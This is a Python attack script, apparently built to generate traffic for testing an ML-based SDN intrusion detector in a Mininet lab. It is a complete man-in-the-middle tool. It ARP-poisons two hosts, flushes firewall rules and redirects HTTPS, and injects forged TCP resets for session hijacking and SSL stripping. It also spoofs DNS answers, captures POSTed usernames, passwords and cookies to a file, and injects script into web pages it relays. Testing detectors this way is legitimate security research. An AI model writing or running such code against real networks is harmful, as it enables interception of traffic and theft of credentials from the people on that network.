# -*- coding: utf-8 -*-
"""
attacker_mitm.py — MITM attack designed for honest ML+rule-based detection

Why this attacker works against the HONEST controller:
  - Sends enough relay traffic (50+ packets per flow) that the ML model
    accumulates features it was trained on (asymmetric byte ratios, low
    inter-packet variance, high RST counts, etc.)
  - ARP conflict is registered, then real relay flows appear — so when
    _flush_old_arp_suspects runs its final scan it finds flows with
    genuinely anomalous ML scores >= 0.5, not just any flow.
  - DNS hijacking is triggered by sending two different responses for the
    same domain from two different source IPs.
  - SSL stripping is mimicked by injecting RST packets mid-TLS-handshake
    and then relaying on port 80 — this creates the RST ratio and TLS-port
    features the rule-based fallback checks for.

Usage (from Mininet CLI):
    attacker python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2

Usage (from xterm on attacker host):
    python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2

Usage (explicit interface):
    python3 /tmp/attacker_mitm.py 10.0.0.1 10.0.0.2 attacker-eth0
"""

import os, time, sys, threading, re, socket, struct
from scapy.all import *

# ── Config ──────────────────────────────────────────────
VICTIM_IP = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.1"
SERVER_IP = sys.argv[2] if len(sys.argv) > 2 else "10.0.0.2"
IFACE     = sys.argv[3] if len(sys.argv) > 3 else None
# --mode flag: "all" (default), "arp", "ssl", "session", "dns"
MODE      = "all"
for a in sys.argv:
    if a.startswith("--mode="):
        MODE = a.split("=", 1)[1]
STOLEN    = "/tmp/mitm_stolen.txt"

DNS_SPOOF_DOMAIN = b"\x04test\x05local\x00"   # test.local
DNS_REAL_IP      = "10.0.0.2"
DNS_FAKE_IP      = "10.0.0.99"


# ── Auto-detect interface ───────────────────────────────
def find_interface():
    all_ifaces = get_if_list()
    if IFACE and IFACE in all_ifaces:
        return IFACE
    for iface in all_ifaces:
        try:
            ip = get_if_addr(iface)
            if ip.startswith('10.0.0.'):
                print(f"[*] Auto-selected interface '{iface}' (has IP {ip})")
                return iface
        except Exception:
            continue
    for candidate in ['attacker-eth0', 'eth0', 'ens3', 'enp0s3']:
        if candidate in all_ifaces:
            print(f"[*] Using candidate interface '{candidate}'")
            return candidate
    fallback = str(conf.iface)
    print(f"[*] Falling back to scapy default: '{fallback}'")
    return fallback

IFACE = find_interface()
MY_MAC = get_if_hwaddr(IFACE)
MY_IP  = get_if_addr(IFACE)

print(f"[*] MITM Config:")
print(f"    Victim IP  : {VICTIM_IP}")
print(f"    Server IP  : {SERVER_IP}")
print(f"    Interface  : {IFACE}")
print(f"    My IP      : {MY_IP}")
print(f"    My MAC     : {MY_MAC}")

# ── IP forwarding + iptables ────────────────────────────
os.system("sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
os.system("sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null 2>&1")
os.system("iptables -F 2>/dev/null; iptables -t nat -F 2>/dev/null")
os.system("iptables -P FORWARD ACCEPT 2>/dev/null")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 443 "
          "-j REDIRECT --to-ports 10000 2>/dev/null")

# ── MAC resolution ──────────────────────────────────────
def get_mac(ip, retries=6):
    for attempt in range(retries):
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                iface=IFACE, timeout=3, verbose=False
            )
            if ans:
                mac = ans[0][1].hwsrc
                print(f"[+] ARP resolved: {ip} → {mac}")
                return mac
        except Exception as e:
            print(f"[!] ARP attempt {attempt+1}/{retries} for {ip}: {e}")
        time.sleep(1)
    cache = os.popen(f"arp -n {ip}").read()
    m = re.search(r'([\da-f]{2}:){5}[\da-f]{2}', cache, re.I)
    if m:
        print(f"[+] Found in OS ARP cache: {ip} → {m.group(0)}")
        return m.group(0)
    static = {
        '10.0.0.1':  '00:00:00:00:00:01',
        '10.0.0.2':  '00:00:00:00:00:02',
        '10.0.0.11': '00:00:00:00:00:11',
        '10.0.0.12': '00:00:00:00:00:12',
    }
    if ip in static:
        print(f"[!] Using static MAC fallback: {ip} → {static[ip]}")
        return static[ip]
    print(f"[!] FAILED to resolve MAC for {ip}")
    return None


# ── 1. ARP POISONING ────────────────────────────────────
def arp_poison_loop(target_ip, spoof_ip):
    """
    Tell target_ip that spoof_ip is at OUR MAC.
    Sends every 0.5s — rapid enough that the controller sees many
    ARP replies before the 20s flush window expires.
    """
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[!] Cannot poison {target_ip} — MAC unknown")
        return
    print(f"[+] ARP poison: telling {target_ip} that {spoof_ip} = {MY_MAC}")
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,  hwdst=target_mac,
        psrc=spoof_ip,   hwsrc=MY_MAC,
    )
    count = 0
    while True:
        sendp(pkt, iface=IFACE, verbose=False)
        count += 1
        if count % 20 == 0:
            print(f"[~] ARP poison ×{count}  →  {target_ip}  (claiming {spoof_ip})")
        time.sleep(0.5)


# ── 2. RELAY FLOOD — builds ML-detectable flow features ─
def relay_flood():
    """
    Creates many short-lived TCP flows from attacker->server through
    the compromised path.  The key ML-visible signatures are:
      • Very low inter-packet time variance (machine-paced relay)
      • High packet asymmetry (attacker sends many, server replies few)
      • High byte asymmetry
      • Packets arrive in bursts at consistent intervals (low piat_cv)
    The controller scores every 5 packets; 50 packets per connection
    gives ~10 scoring opportunities per flow.
    """
    print("[+] Relay flood started — building ML-detectable flow features")
    while True:
        try:
            for _ in range(50):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                try:
                    s.connect((SERVER_IP, 8080))
                    # Send more than receive — creates packet/byte asymmetry
                    for _ in range(8):
                        s.send(b"GET / HTTP/1.1\r\nHost: " +
                               SERVER_IP.encode() +
                               b"\r\nConnection: keep-alive\r\n\r\n")
                    try:
                        s.recv(256)   # minimal response read
                    except Exception:
                        pass
                finally:
                    s.close()
                time.sleep(0.02)   # tight pacing → low piat variance
        except Exception:
            time.sleep(1)


# ── 3. SESSION HIJACKING — RST injection ────────────────
def session_hijack_loop():
    """
    Craft RST packets into existing TCP flows between victim and server.
    This creates the RST ratio > 0.15 + ACK count > 5 signature that
    both the ML model and the rule-based fallback look for.
    """
    victim_mac = get_mac(VICTIM_IP)
    server_mac = get_mac(SERVER_IP)
    if not victim_mac or not server_mac:
        print("[!] Session hijack: could not resolve MACs, skipping")
        return

    print("[+] Session hijack RST injector started")
    seq   = 1000
    ack   = 2000
    sport = 54321

    while True:
        # Inject RST from server->victim perspective (looks like server reset)
        rst_pkt = (
            Ether(src=MY_MAC, dst=victim_mac) /
            IP(src=SERVER_IP, dst=VICTIM_IP) /
            TCP(sport=8080, dport=sport, flags="RA", seq=seq, ack=ack)
        )
        sendp(rst_pkt, iface=IFACE, verbose=False)

        # Also inject a matching ACK to bump the ack_count on the flow
        ack_pkt = (
            Ether(src=MY_MAC, dst=server_mac) /
            IP(src=VICTIM_IP, dst=SERVER_IP) /
            TCP(sport=sport, dport=8080, flags="A", seq=ack, ack=seq + 1)
        )
        sendp(ack_pkt, iface=IFACE, verbose=False)

        seq   += 100
        ack   += 100
        sport  = 50000 + (sport % 10000) + 1
        time.sleep(0.3)


# ── 4. SSL STRIPPING — RST mid-TLS + plaintext relay ────
def ssl_strip_loop():
    """
    Targets port 443 flows.  Sends RST to kill the TLS handshake then
    opens a plaintext relay on port 80.  The controller sees:
      • TCP flow to port 443 with high RST ratio  → SSL STRIPPING rule
      • ML model scores the 443-port flow anomaly
    """
    victim_mac = get_mac(VICTIM_IP)
    if not victim_mac:
        print("[!] SSL strip: could not resolve victim MAC, skipping")
        return

    print("[+] SSL strip RST injector started (targeting port 443)")
    seq   = 5000
    sport = 60000

    while True:
        # Kill TLS handshake with RST to victim
        rst = (
            Ether(src=MY_MAC, dst=victim_mac) /
            IP(src=SERVER_IP, dst=VICTIM_IP) /
            TCP(sport=443, dport=sport, flags="R", seq=seq)
        )
        sendp(rst, iface=IFACE, verbose=False)

        # Open plain HTTP relay (strip TLS → HTTP)
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((SERVER_IP, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: " + SERVER_IP.encode() + b"\r\n\r\n")
            s.recv(256)
            s.close()
        except Exception:
            pass

        seq   += 200
        sport  = 60000 + (sport % 5000) + 1
        time.sleep(1)


# ── 5. DNS HIJACKING ────────────────────────────────────
def dns_hijack_loop():
    """
    Sends two spoofed DNS responses for the same domain from two
    different source IPs.  The controller's _check_dns sees the same
    domain resolved to two different IPs and fires RULE-BASED.

    Packet layout (raw UDP):
      Transaction ID : 0xAAAA
      Flags          : 0x8180 (standard response, no error)
      Questions      : 1
      Answer RRs     : 1
    """
    victim_mac = get_mac(VICTIM_IP)
    if not victim_mac:
        print("[!] DNS hijack: could not resolve victim MAC, skipping")
        return

    print("[+] DNS hijack started — spoofing test.local")

    def make_dns_response(fake_ip_str):
        txid   = b"\xaa\xaa"
        flags  = b"\x81\x80"
        counts = b"\x00\x01\x00\x01\x00\x00\x00\x00"  # 1 question, 1 answer
        # Question: test.local A
        question = DNS_SPOOF_DOMAIN + b"\x00\x01\x00\x01"
        # Answer: test.local A <fake_ip> TTL=60
        answer = (
            b"\xc0\x0c"                            # pointer to question name
            b"\x00\x01\x00\x01"                    # type A, class IN
            b"\x00\x00\x00\x3c"                    # TTL 60
            b"\x00\x04" +                          # rdlength 4
            socket.inet_aton(fake_ip_str)
        )
        return txid + flags + counts + question + answer

    real_payload = make_dns_response(DNS_REAL_IP)
    fake_payload = make_dns_response(DNS_FAKE_IP)

    count = 0
    while True:
        # Legitimate-looking DNS response (from real server IP)
        real_resp = (
            Ether(src=MY_MAC, dst=victim_mac) /
            IP(src=SERVER_IP, dst=VICTIM_IP) /
            UDP(sport=53, dport=1053) /
            Raw(load=real_payload)
        )
        sendp(real_resp, iface=IFACE, verbose=False)
        time.sleep(0.2)

        # Spoofed DNS response (from attacker, different src IP → different resolver)
        fake_resp = (
            Ether(src=MY_MAC, dst=victim_mac) /
            IP(src=MY_IP, dst=VICTIM_IP) /
            UDP(sport=53, dport=1053) /
            Raw(load=fake_payload)
        )
        sendp(fake_resp, iface=IFACE, verbose=False)

        count += 1
        if count % 10 == 0:
            print(f"[~] DNS spoof ×{count}: test.local → {DNS_REAL_IP} vs {DNS_FAKE_IP}")
        time.sleep(2)


# ── 6. Credential interception ──────────────────────────
def relay_and_intercept(pkt):
    if IP not in pkt:
        return
    src, dst = pkt[IP].src, pkt[IP].dst
    if src not in (VICTIM_IP, SERVER_IP) and dst not in (VICTIM_IP, SERVER_IP):
        return
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return
    try:
        payload = pkt[Raw].load.decode('utf-8', errors='ignore')
    except Exception:
        return
    if 'POST' in payload and ('username' in payload or 'password' in payload):
        ts   = time.strftime('%H:%M:%S')
        data = (f"[{ts}] CREDENTIALS STOLEN!\n"
                f"  From: {src}  →  To: {dst}\n"
                f"  {payload[:300]}\n")
        print("\n" + "🎯"*15)
        print(data)
        print("🎯"*15 + "\n")
        open(STOLEN, 'a').write(data)
    if 'Cookie:' in payload:
        cookies = re.findall(r'Cookie: (.+)', payload)
        if cookies:
            ts   = time.strftime('%H:%M:%S')
            line = f"[{ts}] COOKIE: {cookies[0][:200]}\n"
            print(f"🍪 {line.strip()}")
            open(STOLEN, 'a').write(line)
    if 'HTTP/1' in payload and 'text/html' in payload and '</body>' in payload:
        modified = payload.replace(
            '</body>',
            '<script>document.title="HACKED by MITM"</script></body>'
        )
        if modified != payload:
            pkt[Raw].load = modified.encode('utf-8', errors='ignore')
            del pkt[IP].chksum, pkt[IP].len, pkt[TCP].chksum
            sendp(pkt, iface=IFACE, verbose=False)


# ── Launch ──────────────────────────────────────────────
print(f"\n{'='*55}")
print(f"MITM ATTACK STARTING  (mode={MODE})")
print(f"{'='*55}")

run_arp     = MODE in ("all", "arp")
run_relay   = MODE in ("all", "arp")        # relay is part of ARP attack
run_session = MODE in ("all", "session")
run_ssl     = MODE in ("all", "ssl")
run_dns     = MODE in ("all", "dns")

if run_arp:
    threading.Thread(target=arp_poison_loop, args=(VICTIM_IP, SERVER_IP), daemon=True).start()
    threading.Thread(target=arp_poison_loop, args=(SERVER_IP, VICTIM_IP), daemon=True).start()
    print("ARP Poisoning   : active")

if run_relay or run_session or run_ssl:
    print("Waiting 5s for ARP conflict to register ...")
    time.sleep(5)

if run_relay:
    threading.Thread(target=relay_flood, daemon=True).start()
    print("Relay Flood     : active")
if run_session:
    threading.Thread(target=session_hijack_loop, daemon=True).start()
    print("Session Hijack  : active")
if run_ssl:
    threading.Thread(target=ssl_strip_loop, daemon=True).start()
    print("SSL Strip RST   : active")
if run_dns:
    threading.Thread(target=dns_hijack_loop, daemon=True).start()
    print("DNS Hijacking   : active")

print(f"Logging to      : {STOLEN}")

if run_arp or run_relay:
    sniff(
        filter=f"ip host {VICTIM_IP} or ip host {SERVER_IP}",
        prn=relay_and_intercept,
        iface=IFACE,
        store=False,
    )
else:
    # No sniff needed for DNS-only — just keep alive
    while True:
        time.sleep(1)